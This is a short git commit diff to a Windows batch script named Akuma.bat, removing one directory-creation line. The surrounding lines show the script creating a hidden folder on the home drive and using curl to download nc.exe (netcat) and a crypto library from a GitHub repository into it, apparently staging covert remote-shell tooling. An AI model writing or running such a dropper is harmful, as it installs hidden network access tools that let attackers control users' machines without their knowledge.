faba6c068e6178d8c2483bc1cfc0f7445d04b473
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-17 16:55:24 -0700

    Update Akuma.bat

--- Akuma.bat
+++ Akuma.bat
@@ -5,7 +5,6 @@ rmdir /s /q %homedrive%\Akuma
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
-mkdir %homedrive%\Akuma\ncat-portable-5.59BETA1
 mkdir %homedrive%\Akuma\nc 
 curl -L https://github.com/l-urk/Akuma/raw/main/nc.exe > %homedrive%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
